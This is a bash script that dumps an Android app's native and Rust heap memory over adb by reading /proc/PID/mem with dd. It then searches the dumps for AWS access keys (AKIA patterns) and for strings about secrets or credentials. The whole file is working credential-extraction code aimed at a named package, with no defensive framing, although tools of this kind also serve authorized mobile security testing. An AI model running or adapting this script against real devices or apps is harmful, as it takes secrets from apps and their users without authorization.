#!/bin/bash

# Script to dump native/Rust memory regions where credentials are likely stored

PACKAGE_NAME="${1:-com.rustexample}"
OUTPUT_DIR="./native_memory_dump_$(date +%Y%m%d_%H%M%S)"
MAX_DUMP_SIZE_MB=100

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${GREEN}Native Memory Dump Script${NC}"
echo "Package: $PACKAGE_NAME"
echo "Output: $OUTPUT_DIR"
echo ""

mkdir -p "$OUTPUT_DIR"

# Get PID
PID=$(adb shell pidof "$PACKAGE_NAME" 2>/dev/null | tr -d '\r')
if [ -z "$PID" ]; then
    echo -e "${RED}Error: Process not found${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Process ID: $PID${NC}"
echo "$PID" > "${OUTPUT_DIR}/pid.txt"

# Get memory maps
echo -e "${YELLOW}[*] Getting memory maps...${NC}"
adb shell "cat /proc/$PID/maps" > "${OUTPUT_DIR}/maps.txt" 2>/dev/null

# Find native library regions and Rust heap
echo -e "${YELLOW}[*] Finding native memory regions...${NC}"

# Look for libtsdb_timon.so regions (native library)
NATIVE_LIB_REGIONS=$(grep -i "libtsdb_timon\|lib.*timon\|\.so" "${OUTPUT_DIR}/maps.txt" | grep "rw-p" | head -5)

if [ -z "$NATIVE_LIB_REGIONS" ]; then
    echo -e "${YELLOW}[!] No libtsdb_timon.so rw-p regions found${NC}"
    echo -e "${YELLOW}[!] Looking for any .so library regions...${NC}"
    NATIVE_LIB_REGIONS=$(grep "\.so" "${OUTPUT_DIR}/maps.txt" | grep "rw-p" | head -5)
fi

# Look for large rw-p regions (likely Rust heap)
# Create a temp file to store results
TEMP_REGIONS="${OUTPUT_DIR}/temp_regions.txt"
> "$TEMP_REGIONS"

grep "rw-p" "${OUTPUT_DIR}/maps.txt" | while read -r line; do
    RANGE=$(echo "$line" | awk '{print $1}')
    START=$(echo "$RANGE" | cut -d'-' -f1)
    END=$(echo "$RANGE" | cut -d'-' -f2)
    
    # Convert hex to decimal
    START_DEC=$(printf '%d' "0x$START" 2>/dev/null)
    if [ -z "$START_DEC" ] || [ "$START_DEC" = "0" ]; then
        # Fallback to Python if printf fails
        START_DEC=$(python3 -c "print(int('$START', 16))" 2>/dev/null || echo "0")
    fi
    
    END_DEC=$(printf '%d' "0x$END" 2>/dev/null)
    if [ -z "$END_DEC" ] || [ "$END_DEC" = "0" ]; then
        END_DEC=$(python3 -c "print(int('$END', 16))" 2>/dev/null || echo "0")
    fi
    
    SIZE=$((END_DEC - START_DEC))
    if [ $SIZE -gt 1048576 ] && [ $SIZE -lt 2147483647 ]; then  # 1MB to 2GB
        echo "$line $SIZE" >> "$TEMP_REGIONS"
    fi
done

LARGE_RW_REGIONS=$(sort -k2 -n -r "$TEMP_REGIONS" 2>/dev/null | head -10)

echo -e "${GREEN}[+] Found native library regions:${NC}"
echo "$NATIVE_LIB_REGIONS"
echo ""
if [ -n "$LARGE_RW_REGIONS" ]; then
    echo -e "${GREEN}[+] Found large rw-p regions (potential Rust heap):${NC}"
    echo "$LARGE_RW_REGIONS" | head -5
    echo ""
else
    echo -e "${YELLOW}[!] No large rw-p regions found${NC}"
    echo ""
fi

# Dump native library rw-p regions
DUMP_COUNT=0
echo "$NATIVE_LIB_REGIONS" | while read -r line; do
    if [ -z "$line" ]; then continue; fi
    
    RANGE=$(echo "$line" | awk '{print $1}')
    START=$(echo "$RANGE" | cut -d'-' -f1)
    END=$(echo "$RANGE" | cut -d'-' -f2)
    
    START_DEC=$(printf '%d' "0x$START")
    END_DEC=$(printf '%d' "0x$END")
    SIZE=$((END_DEC - START_DEC))
    MAX_SIZE=$((MAX_DUMP_SIZE_MB * 1024 * 1024))
    
    if [ $SIZE -gt $MAX_SIZE ]; then
        DUMP_SIZE=$MAX_SIZE
    else
        DUMP_SIZE=$SIZE
    fi
    
    DUMP_COUNT=$((DUMP_COUNT + 1))
    DUMP_FILE="${OUTPUT_DIR}/native_${DUMP_COUNT}.dump"
    
    echo -e "${YELLOW}[*] Dumping region $START-$END (${DUMP_SIZE} bytes)...${NC}"
    adb shell "dd if=/proc/$PID/mem of=/sdcard/native_${DUMP_COUNT}.dump bs=1 count=$DUMP_SIZE skip=$START_DEC 2>/dev/null"
    adb pull "/sdcard/native_${DUMP_COUNT}.dump" "$DUMP_FILE" 2>/dev/null
    adb shell "rm /sdcard/native_${DUMP_COUNT}.dump" 2>/dev/null
    
    if [ -f "$DUMP_FILE" ] && [ -s "$DUMP_FILE" ]; then
        echo -e "${GREEN}[+] Dumped to $DUMP_FILE${NC}"
        
        # Quick search for credentials
        if command -v strings &> /dev/null; then
            echo -e "${YELLOW}[*] Searching for credentials...${NC}"
            strings "$DUMP_FILE" | grep -E "AKIA[0-9A-Z]{16}" | head -5 > "${DUMP_FILE}.access_keys" 2>/dev/null
            if [ -s "${DUMP_FILE}.access_keys" ]; then
                echo -e "${GREEN}[!] FOUND ACCESS KEYS in $DUMP_FILE:${NC}"
                cat "${DUMP_FILE}.access_keys"
            fi
        fi
    fi
done

# Also dump the largest rw-p region (likely main Rust heap)
echo ""
if [ -n "$LARGE_RW_REGIONS" ]; then
    echo -e "${YELLOW}[*] Dumping largest rw-p region (likely Rust heap)...${NC}"
    LARGEST_REGION=$(echo "$LARGE_RW_REGIONS" | head -1)
    if [ -n "$LARGEST_REGION" ]; then
    RANGE=$(echo "$LARGEST_REGION" | awk '{print $1}')
    START=$(echo "$RANGE" | cut -d'-' -f1)
    END=$(echo "$RANGE" | cut -d'-' -f2)
    
    START_DEC=$(printf '%d' "0x$START")
    END_DEC=$(printf '%d' "0x$END")
    SIZE=$((END_DEC - START_DEC))
    MAX_SIZE=$((MAX_DUMP_SIZE_MB * 1024 * 1024))
    
    if [ $SIZE -gt $MAX_SIZE ]; then
        DUMP_SIZE=$MAX_SIZE
    else
        DUMP_SIZE=$SIZE
    fi
    
    echo -e "${YELLOW}[*] Dumping $START-$END (${DUMP_SIZE} bytes)...${NC}"
    adb shell "dd if=/proc/$PID/mem of=/sdcard/rust_heap.dump bs=1 count=$DUMP_SIZE skip=$START_DEC 2>/dev/null"
    adb pull /sdcard/rust_heap.dump "${OUTPUT_DIR}/rust_heap.dump" 2>/dev/null
    adb shell "rm /sdcard/rust_heap.dump" 2>/dev/null
    
    if [ -f "${OUTPUT_DIR}/rust_heap.dump" ] && [ -s "${OUTPUT_DIR}/rust_heap.dump" ]; then
        echo -e "${GREEN}[+] Rust heap dumped${NC}"
        
        # Extract and search
        if command -v strings &> /dev/null; then
            echo -e "${YELLOW}[*] Extracting strings from Rust heap...${NC}"
            strings "${OUTPUT_DIR}/rust_heap.dump" > "${OUTPUT_DIR}/rust_heap_strings.txt" 2>/dev/null
            
            echo -e "${YELLOW}[*] Searching for credentials...${NC}"
            grep -E "AKIA[0-9A-Z]{16}" "${OUTPUT_DIR}/rust_heap_strings.txt" > "${OUTPUT_DIR}/rust_heap_access_keys.txt" 2>/dev/null
            if [ -s "${OUTPUT_DIR}/rust_heap_access_keys.txt" ]; then
                echo -e "${GREEN}[!] FOUND ACCESS KEYS in Rust heap:${NC}"
                cat "${OUTPUT_DIR}/rust_heap_access_keys.txt"
            fi
            
            grep -iE "access_key|secret|credential" "${OUTPUT_DIR}/rust_heap_strings.txt" | head -20 > "${OUTPUT_DIR}/rust_heap_credentials.txt" 2>/dev/null
        fi
    fi
    fi  # Close if [ -n "$LARGEST_REGION" ]
fi  # Close if [ -n "$LARGE_RW_REGIONS" ]

# If no large regions found, try fallback
if [ -z "$LARGE_RW_REGIONS" ]; then
    echo -e "${YELLOW}[!] No large regions to dump. Trying to dump all rw-p regions > 1MB...${NC}"
    # Fallback: dump first few large regions
    grep "rw-p" "${OUTPUT_DIR}/maps.txt" | head -10 | while read -r line; do
        RANGE=$(echo "$line" | awk '{print $1}')
        START=$(echo "$RANGE" | cut -d'-' -f1)
        END=$(echo "$RANGE" | cut -d'-' -f2)
        START_DEC=$(printf '%d' "0x$START" 2>/dev/null || python3 -c "print(int('$START', 16))" 2>/dev/null || echo "0")
        END_DEC=$(printf '%d' "0x$END" 2>/dev/null || python3 -c "print(int('$END', 16))" 2>/dev/null || echo "0")
        SIZE=$((END_DEC - START_DEC))
        
        if [ $SIZE -gt 1048576 ] && [ $SIZE -lt 104857600 ]; then  # 1MB to 100MB
            echo -e "${YELLOW}[*] Dumping region $START-$END (${SIZE} bytes)...${NC}"
            DUMP_FILE="${OUTPUT_DIR}/region_${START}.dump"
            adb shell "dd if=/proc/$PID/mem of=/sdcard/region_${START}.dump bs=1 count=$SIZE skip=$START_DEC 2>/dev/null"
            adb pull "/sdcard/region_${START}.dump" "$DUMP_FILE" 2>/dev/null
            adb shell "rm /sdcard/region_${START}.dump" 2>/dev/null
            
            if [ -f "$DUMP_FILE" ] && [ -s "$DUMP_FILE" ]; then
                if command -v strings &> /dev/null; then
                    strings "$DUMP_FILE" | grep -E "AKIA[0-9A-Z]{16}" | head -5 > "${DUMP_FILE}.access_keys" 2>/dev/null
                    if [ -s "${DUMP_FILE}.access_keys" ]; then
                        echo -e "${GREEN}[!] FOUND ACCESS KEYS in $DUMP_FILE:${NC}"
                        cat "${DUMP_FILE}.access_keys"
                    fi
                fi
            fi
        fi
    done
fi

# Cleanup
rm -f "$TEMP_REGIONS" 2>/dev/null

echo ""
echo -e "${GREEN}=== Summary ===${NC}"
echo "Output directory: $OUTPUT_DIR"
ls -lh "$OUTPUT_DIR" | tail -n +2
